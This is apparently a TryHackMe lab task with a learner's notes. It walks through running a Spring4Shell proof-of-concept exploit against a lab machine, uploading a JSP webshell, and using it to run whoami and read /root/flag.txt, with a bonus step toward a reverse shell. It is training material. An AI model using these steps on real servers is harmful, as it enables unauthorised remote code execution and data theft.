**Downloading The Exploit**  

We've covered the theory, now it's time to exploit the target!

As this is a network-based exploit, you will need to use the TryHackMe AttackBox or a local VM in order to run the exploit.

Copies of the exploit code can be obtained in three places:

-   Attached to this task, accessible using the blue "Download Task Files" button.
-   On port 8080 of the target machine (`http://10.10.173.174:8080/exploit.zip`).
-   Directly on the AttackBox (`/root/Rooms/Spring4Shell/exploit.py`). This will already have been extracted from the archive for your convenience.  
    

Use whichever method is easiest to obtain a copy of the `exploit.zip` zipfile. The password for this archive is **`TryHackMe123!`**.

When you unzip the archive you should find a single Python script: `exploit.py`. This is a modified version of the proof of concept that is currently circulating online — it is slightly more user friendly than the original (obtained [here](https://github.com/BobTheShoplifter/Spring4Shell-POC)); however, you may use whichever version you wish. This task will assume that you are using the code provided.

  

**The Exploit**  

Read through the exploit code and ensure that you are happy that it does what it claims to do. You should _always_ review unknown exploits before running them.

Having satisfactorily completed our code review, let's start by taking a look at the help menu for the exploit:

Exploit Help Menu

```shell-session
user@attacker:~$ ./exploit.py --help
usage: exploit.py [-h] [-f FILENAME] [-p PASSWORD] [-d DIRECTORY] url

Spring4Shell RCE Proof of Concept

positional arguments:
  url                   Target URL

optional arguments:
  -h, --help            show this help message and exit
  -f FILENAME, --filename FILENAME
                        Name of the file to upload (Default tomcatwar.jsp)
  -p PASSWORD, --password PASSWORD
                        Password to protect the shell with (Default: thm)
  -d DIRECTORY, --directory DIRECTORY
                        The upload path for the file (Default: ROOT)
```

The script requires one argument: `url` — this specifies the target for the POST request. The other three optional arguments can be ignored in the current context.

Let's start by taking a look at the website in a browser (`http://10.10.173.174/`)  

We can easily find our target URL by checking the source code of the website homepage (`view-source:http://10.10.173.174/`).

Specifically we are looking for the "action" of the contact form (the only POST request available to us). This is found on line 20:

`<form id="contactForm" action="/" method="post">`  

The action is "`/`", meaning that our target URL will simply be: `http://10.10.173.174/`.

_**Note:** the trailing slash is very important here!_  

  

**Attack**

Time to use the exploit!

Execute the script (if you're using the AttackBox navigate to the folder /root/Rooms/spring4shell). You should receive output similar to the following:

Running the Exploit

```shell-session
user@attacker:~$ ./exploit.py http://10.10.173.174/
Shell Uploaded Successfully!
Your shell can be found at: http://10.10.173.174/tomcatwar.jsp?pwd=thm&cmd=whoami
```

A webshell should now have been uploaded!

Navigate to the link provided by the exploit to see this in action. You can change which command gets run by changing the `cmd` parameter. By default the command is `whoami`.

_**Note:** Once the exploit has been used successfully once, it cannot be used again until the application has been restarted. If you upload the webshell with the wrong name or directory path then you will need to terminate and re-deploy the target machine._  

Answer the questions below

Follow the steps in the task to exploit Spring4Shell and obtain a webshell.  

Correct Answer

**[Bonus Question: Optional]** Use your webshell to obtain a reverse/bind shell on the target.  

Correct Answer

What is the flag in `/root/flag.txt?`


In AttackBox
```shell
cd /root/Rooms/Spring4Shell/
./exploit.py http://10.10.173.174/
```

![[Pasted image 20220413191054.png]]

http://10.10.173.174/tomcatwar.jsp?pwd=thm&cmd=whoami
![[Pasted image 20220413192433.png]]

http://10.10.173.174/tomcatwar.jsp?pwd=thm&cmd=cat%20/root/flag.txt
![[Pasted image 20220413192539.png]]
